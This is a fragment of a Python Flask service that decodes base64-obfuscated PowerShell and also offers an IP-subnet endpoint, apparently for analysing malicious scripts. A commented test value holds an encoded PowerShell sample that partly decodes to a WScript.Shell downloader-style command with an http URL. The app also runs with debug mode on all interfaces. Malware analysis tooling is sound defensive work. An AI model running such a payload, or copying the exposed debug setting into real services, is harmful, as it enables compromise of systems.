	binary_ascii_alphabet_numbers = ['00100000', '00100001', '00100010', '00100011', '00100100', '00100101', '00100110', '00100111', '00101000', '00101001', '00101010', '00101011', '00101100', '00101101', '00101110', '00101111', '00110000', '00110001', '00110010', '00110011', '00110100', '00110101', '00110110', '00110111', '00111000', '00111001', '00111010', '00111011', '00111100', '00111101', '00111110', '00111111', '01000000', '01000001', '01000010', '01000011', '01000100', '01000101', '01000110', '01000111', '01001000', '01001001', '01001010', '01001011', '01001100', '01001101', '01001110', '01001111', '01010000', '01010001', '01010010', '01010011', '01010100', '01010101', '01010110', '01010111', '01011000', '01011001', '01011010', '01011011', '01011100', '01011101', '01011110', '01011111', '01100000', '01100001', '01100010', '01100011', '01100100', '01100101', '01100110', '01100111', '01101000', '01101001', '01101010', '01101011', '01101100', '01101101', '01101110', '01101111', '01110000', '01110001', '01110010', '01110011', '01110100', '01110101', '01110110', '01110111', '01111000', '01111001', '01111010', '01111011', '01111100', '01111101', '01111110']
	base64_aplabet_array = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/', '=']
	base64_aplabet_numbers = ['000000', '000001', '000010', '000011', '000100', '000101', '000110', '000111', '001000', '001001', '001010', '001011', '001100', '001101', '001110', '001111', '010000', '010001', '010010', '010011', '010100', '010101', '010110', '010111', '011000', '011001', '011010', '011011', '011100', '011101', '011110', '011111', '100000', '100001', '100010', '100011', '100100', '100101', '100110', '100111', '101000', '101001', '101010', '101011', '101100', '101101', '101110', '101111', '110000', '110001', '110010', '110011', '110100', '110101', '110110', '110111', '111000', '111001', '111010', '111011', '111100', '111101', '111110', '111111']
	#test_string = 'IABpAG4AdgBPAEsARQAtAGUAeABwAFIAZQBzAHMASQBPAG4AIAAoACAAWwBTAHQAUgBJAE4AZwBdADoAOgBqAG8AaQBOACgAIAAnACcAIAAsACgAIAAnADMANgA7ADEAMQA5AH4AMQAxADUARAA5ADkATAAxADEANABEADEAMAA1AFEAMQAxADIAOwAxADEANgBMADMAMgB9ADYAMQA6ADMAMgBMADEAMQAwAEwAMQAwADEARwAxADEAOQBLADQANQB+ADEAMQAxAFEAOQA4AH4AMQAwADYATAAxADAAMQBRADkAOQBRADEAMQA2ADsAMwAyAEQANAA1AEsANgA3AEsAMQAxADEARwAxADAAOQA6ADcAOQBMADkAOABEADEAMAA2ADoAMQAwADEAfgA5ADkAfgAxADEANgBqADMAMgB9ADgANwBLADgAMwBRADkAOQBqADEAMQA0AEcAMQAwADUATAAxADEAMgB+ADEAMQA2AEQANAA2AFEAOAAzAGoAMQAwADQAOgAxADAAMQB+ADEAMAA4AEcAMQAwADgAOgA1ADkAOgAzADYAfgAxADEAOQBRADEAMAAxAGoAOQA4ADoAOQA5AH0AMQAwADgAOgAxADAANQBLADEAMAAxAEQAMQAxADAARAAxADEANgBMADMAMgB9ADYAMQB9ADMAMgBqADEAMQAwAEQAMQAwADEAOgAxADEAOQBMADQANQBqADEAMQAxAEcAOQA4AEsAMQAwADYARwAxADAAMQA6ADkAOQBMADEAMQA2AGoAMwAyADoAOAAzADoAMQAyADEAfQAxADEANQBHADEAMQA2AGoAMQAwADEAfgAxADAAOQBEADQANgBLADcAOAA7ADEAMAAxAEwAMQAxADYAOgA0ADYAfgA4ADcASwAxADAAMQBEADkAOABHADYANwBMADEAMAA4ADsAMQAwADUAOwAxADAAMQA6ADEAMQAwAEsAMQAxADYAOgA1ADkAOgAzADYAOwAxADEANAA6ADkANwA6ADEAMQAwAEcAMQAwADAAfQAxADEAMQBHADEAMAA5AGoAMwAyAH4ANgAxADoAMwAyAEQAMQAxADAAOgAxADAAMQBqADEAMQA5AH0ANAA1AH0AMQAxADEAfgA5ADgASwAxADAANgA6ADEAMAAxAFEAOQA5AEwAMQAxADYAfgAzADIAagAxADEANABMADkANwB9ADEAMQAwAFEAMQAwADAAfgAxADEAMQBLADEAMAA5ADoANQA5AEwAMwA2AEwAMQAxADcAUQAxADEANABHADEAMAA4AH0AMQAxADUAOgAzADIAfgA2ADEAfQAzADIAfQAzADkAOgAxADAANABqADEAMQA2AEwAMQAxADYAUQAxADEAMgBRADUAOABRADQANwBqADQANwB+ADkAOABRADEAMAA4AEcAMQAxADcAfgAxADAAMQBMADEAMQA2ADoAMQAxADEAOwAxADEAMABEADEAMAAzAEsAMQAxADcAOgAxADAAMQBRADkAOQBHADkANwB9ADEAMAA5AEwAMQAxADIAOwAxADAAMQBRADEAMQA0AEwAMQAxADUAagA0ADYAagA5ADkARwAxADEAMQBEADEAMAA5AGoANAA2AEwAOQA3AGoAMQAxADcAOwA0ADcAagAxADIAMABEADEAMgAwADsAMQAxADgAUQA4ADkAfgAxADAAMAB+ADQANwBqADQANAA6ADEAMAA0AEsAMQAxADYATAAxADEANgBHADEAMQAyAEsANQA4AH4ANAA3AEcANAA3AH4AMQAwADAAagAxADEAMQBEADkAOAB+ADEAMAA4AH4AMQAwADEATAA5ADkAOgAxADAAOABEADEAMAA1AEQAOQA5ADsAMQAwADcARAA0ADYAfQA5ADkARwAxADEAMQA6ADEAMAA5AEQANAA3AH0ANgA3AEcAOAA3AH4ANgA4AFEAMQAwADgAfgA2ADUATAAxADEAOQBMADEAMAAyADsANgA1AEsANAA3AGoANAA0ADsAMQAwADQASwAxADEANgBqADEAMQA2AEcAMQAxADIATAA1ADgATAA0ADcASwA0ADcASwAxADAAOQBMADEAMQAxADsAMQAxADcARAAxADEAMABEADEAMQA2AEwAOQA3ADoAMQAwADUARAAxADEAMABLADEAMQA4ADsAMQAwADUARAAxADAAMQBLADEAMQA5ADoAMQAxADYASwAxADAAMQA6ADkAOQBLADEAMAA0AEcAMQAxADAARwAxADEAMQBHADEAMAA4AGoAMQAxADEARwAxADAAMwBHADEAMgAxAFEANAA2AEcAOQA5ADsAMQAxADEAOwAxADAAOQBEADQANwA6ADcAOABHADEAMAA3AH4AMQAxADIARAAxADEAOQBHADEAMAA0ADoANAA3AGoANAA0AEwAMQAwADQARAAxADEANgBLADEAMQA2AEcAMQAxADIASwA1ADgAagA0ADcAUQA0ADcATAA5ADkAagA5ADcAUQA5ADkARwA0ADYATAA5ADcAOgAxADIAMgA6ADQANwBMADEAMQAwAH0AMQAxADQATAAxADEANwBEADEAMgAwAEsAMQAwADMASwA4ADAAOwAxADEAOABHADgAMQA6ADQANwA7ADQANABEADEAMAA0ADsAMQAxADYARAAxADEANgBqADEAMQAyADsANQA4AEwANAA3AEwANAA3AEQAMQAxADQARAAxADAAMQBRADEAMQA3ADsAMQAwADgAOwA0ADUARwAxADEAMQBRADEAMQAwAFEAMQAwADgAOwAxADAANQBqADEAMQAwAGoAMQAwADEAagA0ADYAfgAxADAAMABLADEAMAAxAEsANAA3AH4ANgA2ADsAOAA5ADoANwAxAFEAMQAxADcAUQA3ADEAagAxADAANgB9ADQANwB9ADMAOQA6ADQANgBRADgAMwA7ADEAMQAyAH0AMQAwADgAfQAxADAANQBqADEAMQA2AEQANAAwADoAMwA5AH0ANAA0AEcAMwA5AEQANAAxAGoANQA5ADsAMwA2AEQAMQAxADAAfgA5ADcAOgAxADAAOQBqADEAMAAxAGoAMwAyAEwANgAxAEsAMwAyAEsAMwA2ADsAMQAxADQATAA5ADcAOgAxADEAMABRADEAMAAwAH4AMQAxADEAOgAxADAAOQB+ADQANgB9ADEAMQAwADoAMQAwADEATAAxADIAMAB9ADEAMQA2AGoANAAwAFEANAA5AEwANAA0AFEAMwAyAEwANQA0ADsANQAzAGoANQAzADoANQAxADsANQA0AEsANAAxADsANQA5AEcAMwA2AEcAMQAxADIAagA5ADcARAAxADEANgBqADEAMAA0AEsAMwAyAEwANgAxADoAMwAyAEQAMwA2ADoAMQAwADEASwAxADEAMABHADEAMQA4AEsANQA4AEsAMQAxADYARwAxADAAMQB+ADEAMAA5AEsAMQAxADIARAAzADIAfgA0ADMARwAzADIARwAzADkATAA5ADIAfgAzADkATAAzADIAOgA0ADMAOwAzADIAfgAzADYAUQAxADEAMABMADkANwBRADEAMAA5AEcAMQAwADEARAAzADIAOgA0ADMAOgAzADIAfQAzADkAOgA0ADYATAAxADAAMQB9ADEAMgAwADsAMQAwADEASwAzADkAfgA1ADkAOgAxADAAMgBEADEAMQAxAH0AMQAxADQAfgAxADAAMQBEADkANwBHADkAOQA6ADEAMAA0ADsANAAwAH4AMwA2ADoAMQAxADcAagAxADEANABRADEAMAA4AH0AMwAyAEQAMQAwADUAOwAxADEAMABMADMAMgBqADMANgBRADEAMQA3ADoAMQAxADQAOwAxADAAOABqADEAMQA1ADoANAAxAH0AMQAyADMAfgAxADEANgB+ADEAMQA0AEwAMQAyADEAfQAxADIAMwBqADMANgBEADEAMQA5AEQAMQAwADEATAA5ADgAfQA5ADkAUQAxADAAOABMADEAMAA1AEcAMQAwADEAagAxADEAMABRADEAMQA2ADsANAA2ADoANgA4AH0AMQAxADEARAAxADEAOQA7ADEAMQAwAGoAMQAwADgATAAxADEAMQBEADkANwB9ADEAMAAwAEcANwAwAEwAMQAwADUASwAxADAAOABqADEAMAAxADsANAAwAFEAMwA2AFEAMQAxADcARAAxADEANABMADEAMAA4AEwANAA2AEcAOAA0ADoAMQAxADEARwA4ADMARAAxADEANgBMADEAMQA0ADoAMQAwADUATAAxADEAMAA7ADEAMAAzAH4ANAAwAH4ANAAxAGoANAA0AEQAMwAyAEsAMwA2AGoAMQAxADIASwA5ADcARAAxADEANgA7ADEAMAA0AEsANAAxAEwANQA5ADoAOAAzAEsAMQAxADYATAA5ADcASwAxADEANABRADEAMQA2AEwANAA1AGoAOAAwAEQAMQAxADQASwAxADEAMQB+ADkAOQB9ADEAMAAxAEsAMQAxADUAOwAxADEANQBqADMAMgBRADMANgBEADEAMQAyAEcAOQA3AFEAMQAxADYAagAxADAANABEADUAOQBLADkAOABHADEAMQA0AH0AMQAwADEAOwA5ADcAfgAxADAANwBMADUAOQB+ADEAMgA1AEsAOQA5AEcAOQA3AEwAMQAxADYATAA5ADkAOwAxADAANABqADEAMgAzAEQAMQAxADkAUQAxADEANAA6ADEAMAA1ADoAMQAxADYAfgAxADAAMQBRADQANQBqADEAMAA0AEsAMQAxADEASwAxADEANQBMADEAMQA2ADoAMwAyAEcAMwA2AEcAOQA1AEwANAA2AEsANgA5AH0AMQAyADAAUQA5ADkATAAxADAAMQB9ADEAMQAyAH4AMQAxADYARAAxADAANQBEADEAMQAxAEcAMQAxADAAfQA0ADYARwA3ADcAOwAxADAAMQB9ADEAMQA1AEwAMQAxADUAUQA5ADcARwAxADAAMwB+ADEAMAAxAEsANQA5ADoAMQAyADUAfgAxADIANQAnAC4AcwBQAGwAaQB0ACgAJwB+AH0AOwBLAFEAagBHAEwARAA6ACcAKQAgAHwAJQB7ACgAIABbAGkAbgBUAF0AJABfAC0AYQBTACAAWwBDAEgAYQByAF0AKQAgAH0AIAApACAAKQApAA=='
	for i in range(len(test_string)):
		for ii in range(len(base64_aplabet_array)):
			if test_string[i] == base64_aplabet_array[ii] and test_string[i] != '=':
				first_iter_binary_array.append(base64_aplabet_numbers[ii])
		if i == len(test_string)-1 and test_string[i] == '=':
			first_iter_binary_array.append('000000')
	single_long_bit_array_string = ''.join(first_iter_binary_array)
	for i in range(0,len(single_long_bit_array_string),8):
		second_iter_binary_array.append(single_long_bit_array_string[i:i+8])
	for i in range(len(second_iter_binary_array)):
		for ii in range(len(binary_ascii_alphabet_numbers)):
			if second_iter_binary_array[i] == binary_ascii_alphabet_numbers[ii]:
				deobfuscated_character_array.append(ascii_alphabet_array[ii])
	deobfuscated_string = (''.join(deobfuscated_character_array)).replace('`', '')
	#print(deobfuscated_string)
	print()
	find_split = re.findall('split', deobfuscated_string, re.I)
	#print(re.findall('split', deobfuscated_string, re.I))
	find_join = re.findall('join', deobfuscated_string, re.I)
	#print(re.findall('join', deobfuscated_string, re.I))
	find_char = re.findall('char', deobfuscated_string, re.I)
	#print(re.findall('char', deobfuscated_string, re.I))
	init_deobfuscated_ascii_string = (re.findall('\([\S\s]+\'\.', deobfuscated_string))[0]
	init_deobfuscated_ascii_string_array = []	
	if find_split != []:
		split_characters = re.findall('split[\s]*\(\'([\S\s]+?)\'\)', deobfuscated_string, re.I)
		#print(split_characters)
		split_characters_array = re.findall('[\S\s]', split_characters[0], re.I)
		#print(split_characters_array)
		for i in range(len(split_characters_array)):
			init_deobfuscated_ascii_string = init_deobfuscated_ascii_string.replace(split_characters_array[i], ' ')
			#print('\n\n\n\n')
			#print(init_deobfuscated_ascii_string)
		init_deobfuscated_ascii_string_array = init_deobfuscated_ascii_string.split()
	print('\n\n')
	if init_deobfuscated_ascii_string_array != []:
		for i in range(len(init_deobfuscated_ascii_string_array)):
			for ii in range(len(ascii_num_array)):
				try:
					int(init_deobfuscated_ascii_string_array[i])
				except:
					continue
				if int(init_deobfuscated_ascii_string_array[i]) == ascii_num_array[ii]:
					#print(ascii_alphabet_array[ii], end='')
					siphoned_ascii_deobfuscated_array.append(ascii_alphabet_array[ii])
		siphoned_ascii_deobfuscated_string = ''.join(siphoned_ascii_deobfuscated_array)
	
	if siphoned_ascii_deobfuscated_string == '':
		siphoned_ascii_deobfuscated_string = '***Second Deobfuscator could not fully decode PowerShell info**\n\n'
	print('\n\n\n-----------------------------------------------------\n\n'+siphoned_ascii_deobfuscated_string+'\n\n\n\nOriginal Decoded String Before Full Deob:\n\n'+deobfuscated_string+'\n\n')
	print('\n\n')
	
	response += '\n\n\n-----------------------------------------------------\n\n'+siphoned_ascii_deobfuscated_string+'\n\n\n\nOriginal Decoded String Before Full Deob:\n\n'+deobfuscated_string+'\n\n\n\n'
	
	return response
			

	
	

#Declaring sub-route/path foreign hosts will use to interact with the ip_subnet REST Service 
#The @ denotes a Python decorator
#Decorators modify functions immediately following them 
#Using Python's Flask library, the decorator along with the function definition make a single code block -- if not together an error will occur
@app.route('/ip_subnet/<string:ip>', methods=['POST'], defaults={"subnet_mask":"8"})
@app.route('/ip_subnet/<string:ip>/', methods=['POST'], defaults={"subnet_mask":"8"})
@app.route('/ip_subnet/<string:ip>/<path:subnet_mask>', methods=['POST'], defaults={"subnet_mask":"8"})
def return_subnetted_ip(ip,subnet_mask):
		
	if str(subnet_mask).isdigit() == True:
		subnet_mask = '/'+str(subnet_mask)
	
	response = return_subnet_table().ip_input(ip, str(subnet_mask).replace('"',''))
	return response
			
			
			
#Declaring sub-route/path foreign hosts will use to interact with the powershell_deobfuscator REST Service /chat/id endpoint
@app.route('/powershell_deobfuscator/<string:powershell_string>', methods=['POST'])
@app.route('/powershell_deobfuscators/<string:powershell_string>', methods=['POST'])
def powershell_deobfuscator(powershell_string):
	
	test_string = powershell_string
	response = deobfuscate_powershell_base64(test_string)
	return response
			
	
#Running app instance of Flask with Debugging if there is an error
#When the run method of the object of the Flask class is called, it automatically executes functions decorated with the object name
app.run(host='0.0.0.0', debug=True, port=****)